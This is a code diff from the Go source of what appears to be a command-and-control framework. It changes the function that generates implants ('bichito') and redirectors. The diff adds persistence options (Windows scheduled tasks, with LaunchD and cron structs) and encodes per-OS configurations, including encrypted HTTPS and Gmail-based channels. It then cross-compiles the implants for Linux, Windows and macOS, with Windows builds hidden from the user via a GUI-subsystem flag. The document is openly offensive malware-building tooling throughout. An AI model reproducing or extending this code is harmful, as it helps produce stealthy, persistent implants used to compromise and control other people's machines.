@@ -88,32 +88,50 @@ type Bitwitter struct {
 }
 
 //Persistence Modules Structs
-type WindowServices struct {
+type BiPersistenceWinSchtasks struct {
+	TaskName string   `json:"taskname"`
+	Path string   `json:"implantpath"`
+	
+}
 
+type BiPersistenceLaunchD struct {
+	LaunchdName string   `json:"launchdname"`
+	Path string   `json:"implantpath"`
+	
+}
+
+type BiPersistenceLinCron struct {
+	CronName string   `json:"cronname"`
+	Path string   `json:"implantpath"`
 }
 
 
-func createImplant(name string,ttl string,resptime string,coms string,comsparams string,persistence string,redirectors []Red) string{
+func createImplant(name string,ttl string,resptime string,coms string,comsparams string,persistenceOSX string,
+		persistenceOSXParams string,persistenceWindows string,persistenceWindowsParams string,persistenceLinux string,persistenceLinuxParams string,redirectors []Red) string{
 
 	var(
+		errbuf,outbuf bytes.Buffer
+
 		implant Implant
 		modules Modules
+
 		redconfig RedConfig
 		biconfig BiConfig
-		errbuf,outbuf bytes.Buffer
+
 		redCompilParams string
-		biCompilParams string
+		biCompilParamsOSX string
+		biCompilParamsWindows string
+		biCompilParamsLinux string
 	)
 
-
-	redconfig = RedConfig{getRoasterStringDB(),"","","","",""}
-	biconfig = BiConfig{ttl,resptime,"","",""}
 
 	//// Generate Auth Tokens for implant and it to DB,add auth tokens to compiling params, add folder
 	redtoken := randomString(22)
 	bitoken := randomString(22)
+
+	//Encode to JSON objects to save Implant Configurations on DB
     bufM := new(bytes.Buffer)
-    modules = Modules{coms,persistence}
+    modules = Modules{coms,persistenceOSX,persistenceWindows,persistenceLinux}
 	json.NewEncoder(bufM).Encode(modules)
 	resultM := bufM.String()
 	implant = Implant{name,ttl,resptime,redtoken,bitoken,resultM}
@@ -122,6 +140,10 @@ func createImplant(name string,ttl string,resptime string,coms string,comsparams
 		elog := fmt.Sprintf("%s%s","ImplantGeneration(Implant Exists):",errI)
 		return elog
 	}
+
+
+	redconfig = RedConfig{getRoasterStringDB(),"","","","",""}
+	biconfig = BiConfig{ttl,resptime,"","",""}
 
 	redconfig.Token = redtoken
 	redconfig.BiToken = bitoken
@@ -153,7 +175,7 @@ func createImplant(name string,ttl string,resptime string,coms string,comsparams
 	redconfig.HiveFingenprint = strings.Split(outbuf.String(),"\n")[0]
 	outbuf.Reset()
 
-	//Switch case for Implant Communication Modules
+	//Switch case for Implant/Redirectors Communication Modules Parameters
 	switch coms{
 		case "paranoidtlsgo":
 
@@ -229,28 +251,22 @@ func createImplant(name string,ttl string,resptime string,coms string,comsparams
 				biparanoidhttps.Redirectors = append(biparanoidhttps.Redirectors,domainO.Domain)
 			}
 
-			fmt.Println(biparanoidhttps.Redirectors)
+			//Debug
+			//fmt.Println(biparanoidhttps.Redirectors)
+			
 			//Encode from JSON to string Redirector and Implant Configurations
-
 			bufRP := new(bytes.Buffer)
 			json.NewEncoder(bufRP).Encode(redparanoidhttps)
 			resultRP := bufRP.String()
 			redconfig.Coms = resultRP 
 	    	
-	    	bufRC := new(bytes.Buffer)
-			json.NewEncoder(bufRC).Encode(redconfig)
-			redCompilParams = bufRC.String()
-
-
 
 			bufBP := new(bytes.Buffer)
 			json.NewEncoder(bufBP).Encode(biparanoidhttps)
 			resultBP := bufBP.String()
 			biconfig.Coms = resultBP 
 	    	
-	    	bufBC := new(bytes.Buffer)
-			json.NewEncoder(bufBC).Encode(biconfig)
-			biCompilParams = bufBC.String()
+
 		case "letsencrypthttpsgo":
 		// Error Hnadling
 		case "gmailgo":
@@ -322,41 +338,81 @@ func createImplant(name string,ttl string,resptime string,coms string,comsparams
 			redconfig.Saas = saas
 			redconfig.Coms = resultRP 
 	    	
-	    	bufRC := new(bytes.Buffer)
-			json.NewEncoder(bufRC).Encode(redconfig)
-			redCompilParams = bufRC.String()
-
-
 
 			bufBP := new(bytes.Buffer)
 			json.NewEncoder(bufBP).Encode(bigmail)
 			resultBP := bufBP.String()
 			biconfig.Coms = resultBP 
-	    	
-	    	bufBC := new(bytes.Buffer)
-			json.NewEncoder(bufBC).Encode(biconfig)
-			biCompilParams = bufBC.String()
+
 		default:
+			elog := "CompilingCommands(ImplantGeneration):A network Module need to be choosen"
+			return elog
 
 	}
 
-	switch persistence{
+	//With Module Parameters Encoded, craft the final Json blob to be passed as compile params to both redirectors and Implants
+	bufRedCompilParams := new(bytes.Buffer)
+	json.NewEncoder(bufRedCompilParams).Encode(redconfig)
+	redCompilParams = bufRedCompilParams.String()
+
+	//Redirector module for the moment is just the network module
+	rModules := coms
+
+	
+	var bModulesOSX,bModulesWindows,bModulesLinux string
+
+	//Configure Persistence Params
+	switch persistenceOSX{
 
 		default:
+			biconfig.Persistence = "NoPersistence"
+			bModulesOSX = coms + "," + "nopersistence"
 	}
+
+	//Craft OSX Compiled Params for the Implant
+	bufbiCompilParamsOSX := new(bytes.Buffer)
+	json.NewEncoder(bufbiCompilParamsOSX).Encode(biconfig)
+	biCompilParamsOSX = bufbiCompilParamsOSX.String()
+
+
+	switch persistenceWindows{
+		case "schtasks":
+
+			biconfig.Persistence = persistenceWindowsParams
+			bModulesWindows = coms + "," + "schtasks"
+
+		default:
+			biconfig.Persistence = "NoPersistence"
+			bModulesWindows = coms + "," + "nopersistence"
+	}
+
+	bufbiCompilParamsWindows := new(bytes.Buffer)
+	json.NewEncoder(bufbiCompilParamsWindows).Encode(biconfig)
+	biCompilParamsWindows = bufbiCompilParamsWindows.String()
+
+	switch persistenceLinux{
+
+		default:
+			biconfig.Persistence = "NoPersistence"
+			bModulesLinux = coms + "," + "nopersistence"
+	}
+
+	bufbiCompilParamsLinux := new(bytes.Buffer)
+	json.NewEncoder(bufbiCompilParamsLinux).Encode(biconfig)
+	biCompilParamsLinux = bufbiCompilParamsLinux.String()
+
+
 
 
 	// Generate executables/shellcodes for redirectors and implants in target Implant Folder
 
-	rModules := coms
-	bModules := coms //+ "," + persistence
-
-
 
 	//Debug: Catch Bichitos JSON arguments
-	fmt.Println("GOOS=linux GOARCH=amd64 /usr/local/STHive/sources/go/bin/go build --ldflags '-X main.parameters="+ redCompilParams +"' -tags " + rModules + " -o "+ implantFolder +"/redirector redirector")
-	fmt.Println("GOOS=windows GOARCH=amd64 /usr/local/STHive/sources/go/bin/go build --ldflags '-X main.parameters="+ biCompilParams +" -H=windowsgui' -tags "+ bModules +" -o "+ implantFolder +"/bichitoW bichito")
-
+	fmt.Println("Red Params: "+ redCompilParams +" Module Tags: "+ rModules)
+	fmt.Println("Windows Implant Params: "+ biCompilParamsWindows +" Windows Module Tags: "+ bModulesWindows)
+	fmt.Println("OSX Implant Params: "+ biCompilParamsOSX +" OSX Module Tags: "+ bModulesOSX)
+	fmt.Println("Linux Implant Params: "+ biCompilParamsLinux +" Linux Module Tags: "+ bModulesLinux)
+	
 	
 	//redgen := exec.Command("/bin/sh","-c", "export GOPATH=/usr/local/STHive/sources/; GOOS=linux GOARCH=amd64 /usr/local/STHive/sources/go/bin/go build --ldflags '-X main.parameters="+ redCompilParams +"' -tags " + rModules + " -o "+ implantFolder +"/redirector redirector")
 
@@ -375,14 +431,14 @@ func createImplant(name string,ttl string,resptime string,coms string,comsparams
 	redgen.Env = append(redgen.Env,"GOCACHE=/tmp/.cache")	
 
 
-	bichitoLx32 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParams,"-tags",bModules,"-o",implantFolder+"/bichitoLinuxx32","bichito")
+	bichitoLx32 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParamsLinux,"-tags",bModulesLinux,"-o",implantFolder+"/bichitoLinuxx32","bichito")
 	bichitoLx32.Env = os.Environ()
 	bichitoLx32.Env = append(bichitoLx32.Env,"GOPATH=/usr/local/STHive/sources/")
 	bichitoLx32.Env = append(bichitoLx32.Env,"GOOS=linux")
 	bichitoLx32.Env = append(bichitoLx32.Env,"GOARCH=386")
 	bichitoLx32.Env = append(bichitoLx32.Env,"GOCACHE=/tmp/.cache")
 
-	bichitoLx64 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParams,"-tags",bModules,"-o",implantFolder+"/bichitoLinuxx64","bichito")
+	bichitoLx64 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParamsLinux,"-tags",bModulesLinux,"-o",implantFolder+"/bichitoLinuxx64","bichito")
 	bichitoLx64.Env = os.Environ()
 	bichitoLx64.Env = append(bichitoLx64.Env,"GOPATH=/usr/local/STHive/sources/")
 	bichitoLx64.Env = append(bichitoLx64.Env,"GOOS=linux")
@@ -390,6 +446,8 @@ func createImplant(name string,ttl string,resptime string,coms string,comsparams
 	bichitoLx64.Env = append(bichitoLx64.Env,"GOCACHE=/tmp/.cache")
 
 
+
+	/*
 	bichitoWx32 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParams,"-tags",bModules,"-o",implantFolder+"/bichitoWindowsx32","bichito")
 	bichitoWx32.Env = os.Environ()
 	bichitoWx32.Env = append(bichitoWx32.Env,"GOPATH=/usr/local/STHive/sources/")
@@ -404,7 +462,7 @@ func createImplant(name string,ttl string,resptime string,coms string,comsparams
 	bichitoWx64.Env = append(bichitoWx64.Env,"GOARCH=amd64")
 	bichitoWx64.Env = append(bichitoWx64.Env,"GOCACHE=/tmp/.cache")
 
-	/*
+	
 	bichitoOx32 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParams,"-tags",bModules,"-o",implantFolder+"/bichitoDarwinx32","bichito")
 	bichitoOx32.Env = os.Environ()
 	bichitoOx32.Env = append(bichitoOx32.Env,"GOPATH=/usr/local/STHive/sources/")
@@ -420,7 +478,30 @@ func createImplant(name string,ttl string,resptime string,coms string,comsparams
 	bichitoOx64.Env = append(bichitoOx64.Env,"GOCACHE=/tmp/.cache")
 	*/
 
-	bichitoOx32 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParams,"-tags",bModules,"-o",implantFolder+"/bichitoOSXx32","bichito")
+
+	
+	bichitoWx32 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParamsWindows+" -H=windowsgui","-tags",bModulesWindows,"-o",implantFolder+"/bichitoWindowsx32","bichito")
+	bichitoWx32.Env = os.Environ()
+	bichitoWx32.Env = append(bichitoWx32.Env,"GOPATH=/usr/local/STHive/sources/")
+	bichitoWx32.Env = append(bichitoWx32.Env,"GOOS=windows")
+	bichitoWx32.Env = append(bichitoWx32.Env,"GOARCH=386")
+	bichitoWx32.Env = append(bichitoWx32.Env,"GOCACHE=/tmp/.cache")
+	bichitoWx32.Env = append(bichitoWx32.Env,"CGO_ENABLED=1")
+	bichitoWx32.Env = append(bichitoWx32.Env,"CC=i686-w64-mingw32-gcc")
+	bichitoWx32.Env = append(bichitoWx32.Env,"CXX=i686-w64-mingw32-g++")
+
+	bichitoWx64 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParamsWindows+" -H=windowsgui","-tags",bModulesWindows,"-o",implantFolder+"/bichitoWindowsx64","bichito")
+	bichitoWx64.Env = os.Environ()
+	bichitoWx64.Env = append(bichitoWx64.Env,"GOPATH=/usr/local/STHive/sources/")
+	bichitoWx64.Env = append(bichitoWx64.Env,"GOOS=windows")
+	bichitoWx64.Env = append(bichitoWx64.Env,"GOARCH=amd64")
+	bichitoWx64.Env = append(bichitoWx64.Env,"GOCACHE=/tmp/.cache")
+	bichitoWx64.Env = append(bichitoWx64.Env,"CGO_ENABLED=1")
+	bichitoWx64.Env = append(bichitoWx64.Env,"CC=x86_64-w64-mingw32-gcc")
+	bichitoWx64.Env = append(bichitoWx64.Env,"CXX=x86_64-w64-mingw32-g++")
+	
+
+	bichitoOx32 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParamsOSX,"-tags",bModulesOSX,"-o",implantFolder+"/bichitoOSXx32","bichito")
 	bichitoOx32.Env = os.Environ()
 	bichitoOx32.Env = append(bichitoOx32.Env,"GOPATH=/usr/local/STHive/sources/")
 	bichitoOx32.Env = append(bichitoOx32.Env,"GOOS=darwin")
@@ -430,7 +511,7 @@ func createImplant(name string,ttl string,resptime string,coms string,comsparams
 	bichitoOx32.Env = append(bichitoOx32.Env,"CGO_ENABLED=1")
 	bichitoOx32.Env = append(bichitoOx32.Env,"CC=o32-clang")
 
-	bichitoOx64 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParams,"-tags",bModules,"-o",implantFolder+"/bichitoOSXx64","bichito")
+	bichitoOx64 := exec.Command("/usr/local/STHive/sources/go/bin/go","build","--ldflags","-X main.parameters="+biCompilParamsOSX,"-tags",bModulesOSX,"-o",implantFolder+"/bichitoOSXx64","bichito")
 	bichitoOx64.Env = os.Environ()
 	bichitoOx64.Env = append(bichitoOx64.Env,"GOPATH=/usr/local/STHive/sources/")
 	bichitoOx64.Env = append(bichitoOx64.Env,"GOOS=darwin")
@@ -479,9 +560,9 @@ func createImplant(name string,ttl string,resptime string,coms string,comsparams
 	implantCompillingError := comperrRed.String()+comperrLx32.String()+comperrLx64.String()+compoutWx32.String()+compoutWx64.String()+compoutOx32.String()+compoutOx64.String()
 
 	//Debug:
-	//implantCompillingOut := compoutRed.String()+compoutLx32.String()+compoutLx64.String()+compoutWx32.String()+compoutWx64.String()+compoutOx32.String()+compoutOx64.String()
-	//fmt.Println("Implant CompErr Debug: "+implantCompillingError)
-	//fmt.Println("Implant CompOut Debug: "+implantCompillingOut)
+	implantCompillingOut := compoutRed.String()+compoutLx32.String()+compoutLx64.String()+compoutWx32.String()+compoutWx64.String()+compoutOx32.String()+compoutOx64.String()
+	fmt.Println("Implant CompErr Debug: "+implantCompillingError)
+	fmt.Println("Implant CompOut Debug: "+implantCompillingOut)
 
 	// Record the error when generating a new Implant Set
 	if (implantCompillingError != ""){
